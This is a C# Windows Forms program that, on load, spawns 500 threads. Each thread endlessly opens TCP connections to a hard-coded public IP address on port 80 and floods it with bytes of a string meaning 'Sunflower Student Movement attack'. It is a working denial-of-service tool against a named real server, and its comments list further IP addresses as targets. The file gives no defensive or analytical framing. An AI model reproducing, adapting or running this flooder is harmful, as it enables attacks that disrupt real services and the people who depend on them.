using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Net.Sockets;
namespace yuteh
{
    public partial class Form1 : Form
    {
        const string maxS = "我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我我";
        Thread[] t = new Thread[750 / 2]; Thread[] t2 = new Thread[750 / 2];
        int port;

        int i = 0;

        public Form1()
        {
            InitializeComponent();
        }
        void test_contect()
        {
            // bool ok = false;
            int myI;
            TcpClient tcpc = new TcpClient();
            NetworkStream nws;// =  NetworkStream;
        // Socket tcpc = new Socket(AddressFamily.Unknown, SocketType.Raw, ProtocolType.Raw);
        //port 1 試到 20000
        //多執行緒像輪唱 不必唱完在換下一人
        restart:


            System.Net.IPEndPoint endp;
            //     System.Net.SocketAddress soca;

            i++;
            myI = i;
            //  MessageBox.Show(i.ToString());
            //10.231.136.31 yuteh
            //163.20.142.2 leli
            //116.124.8.103 yahoo
            try
            {
                //  Socket s = new Socket(new AddressFamily (),SocketType .Raw ,ProtocolType .IP );

                //
                //   ok = true;

                //tcpc = new TcpClient();


                //  endp = (System.Net.IPEndPoint)tcpc.Client.LocalEndPoint;
                //  port = endp.Port;
                //tcpc.SetSocketOption (SocketOptionLevel .IP ,SocketOptionName .HeaderIncluded ,1000);
                //    Y 10.231.136.31
                tcpc.Connect("210.69.138.150", 80);

                //const int sdddi = 0;

                //catch
                //{
                //    ok = false;
                //}
                //if (!ok)
                //{
                //    // label1.Text = myI.ToString();
                //    //     MessageBox.Show(myI.ToString());
                //    //      MessageBox.Show("");
                //}


                nws = tcpc.GetStream();
                for (int j = 0; j != int.MaxValue; )
                {
                    nws.Write(Encoding.Default.GetBytes("太陽花學運攻擊"), 0, 1);


                    j++;
                }
                if ((myI % 100) == 0)
                {
                    label1.Text = myI.ToString();
                }
            }
            catch (Exception ex)
            {


            }




            //錯誤到達20000之後自動重新開始


            goto restart;








            /*
            TcpClient tcpc = new TcpClient("10.231.136.31", 5094);
            NetworkStream nws = tcpc.GetStream();
            byte[] msg = Encoding.Default.GetBytes(textBox1.Text);
            nws.Write(msg, 0, msg.Length);
            */


        }
        void conn2()
        {
            // bool ok = false;
            int myI;
            TcpClient tcpc = new TcpClient();
            NetworkStream nws;// =  NetworkStream;
        // Socket tcpc = new Socket(AddressFamily.Unknown, SocketType.Raw, ProtocolType.Raw);
        //port 1 試到 20000
        //多執行緒像輪唱 不必唱完在換下一人
        restart:


            System.Net.IPEndPoint endp;
            //     System.Net.SocketAddress soca;

            i++;
            myI = i;
            //  MessageBox.Show(i.ToString());
            //120.102.225.12 yuteh
            //163.20.142.2 leli
            //116.124.8.103 yahoo
            try
            {
                //  Socket s = new Socket(new AddressFamily (),SocketType .Raw ,ProtocolType .IP );

                //
                //   ok = true;

                //tcpc = new TcpClient();


                //  endp = (System.Net.IPEndPoint)tcpc.Client.LocalEndPoint;
                //  port = endp.Port;
                //tcpc.SetSocketOption (SocketOptionLevel .IP ,SocketOptionName .HeaderIncluded ,1000);
                //     Y 10.231.136.31
                tcpc.Connect("210.69.138.150", 80);

                //const int sdddi = 0;

                //catch
                //{
                //    ok = false;
                //}
                //if (!ok)
                //{
                //    // label1.Text = myI.ToString();
                //    //     MessageBox.Show(myI.ToString());
                //    //      MessageBox.Show("");
                //}


                nws = tcpc.GetStream();
                for (int j = 0; j != int.MaxValue; )
                {
                    nws.Write(Encoding.Default.GetBytes("太陽花學運攻擊"), 0, 1);


                    j++;
                }
                if ((myI % 100) == 0)
                {
                    label1.Text = myI.ToString();
                }
            }
            catch (Exception ex)
            {



            }




            //錯誤到達20000之後自動重新開始


            goto restart;


        }
        struct Header
        {
            byte ip;


        }









        void test()
        {
            bool b = false;
            //label1.Text = b.ToString();
            MessageBox.Show(b.ToString());
            b = true;

        }


        private void Form1_Load(object sender, EventArgs e)
        {
            Control.CheckForIllegalCrossThreadCalls = false;
            CheckForIllegalCrossThreadCalls = false;
            this.FormClosing += new FormClosingEventHandler(Form1_FormClosing);
            // double[] d = new double[10];
            // (255 *255*255*255);
            //MessageBox.Show((255*255*255*255).ToString ());





            for (int i = 0; i != 500 / 2; )
            {
                t[i] = new Thread(new ThreadStart(test_contect));
                t[i].Start();


                i++;
            }
            for (int i = 0; i != 500 / 2; )
            {
                t2[i] = new Thread(new ThreadStart(conn2));
                t2[i].Start();

           

                i++;
            }

        }

        void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {

            //throw new NotImplementedException();


        }
        Thread tdsds;
        private void button1_Click(object sender, EventArgs e)
        {
            //test_contect();      

            // TcpClient tcpc = new TcpClient();
            // // MessageBox.Show("");
            // tcpc.Connect("173.194.72.94", 80);

            // Socket s;SocketInformation sinfo = new SocketInformation ();

            // s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            // s.Bind (((EndPoint )new IPEndPoint (IPAddress .Parse ("173.194.72.94"),80)));
            // s.Send (Encoding.ASCII.GetBytes("GET / HTTP/1.1" + " Host:www.google.com"));
            //     res:

            // byte[] bfr = new byte[10000000];
            //s.Receive(bfr);
            // MessageBox.Show(Encoding.ASCII.GetString(bfr));
            // goto res;


            // IPEndPoint endp;
            // endp = (System.Net.IPEndPoint)tcpc.Client.LocalEndPoint;
            // port = endp.Port;
            // byte[] b = new byte[1];
            // b[0] = 9;
            // NetworkStream nws = tcpc.GetStream(); nws.Write(Encoding.ASCII.GetBytes("GET / HTTP/1.1" + " Host:www.google.com"), 0, 10);
            // tdsds = new Thread(new ThreadStart(listen));
            // tdsds.Start();
        }
        void listen()
        {
            MessageBox.Show("");
            TcpListener tcpl = new TcpListener(new IPEndPoint(IPAddress.Parse("192.168.0.12"), port)); tcpl.Start();
            Socket s = tcpl.AcceptSocket();
            MessageBox.Show("我");
        res:

            byte[] bfr = new byte[10000000];
            s.Receive(bfr);
            MessageBox.Show(Encoding.ASCII.GetString(bfr));
            goto res;
        }
    }
}
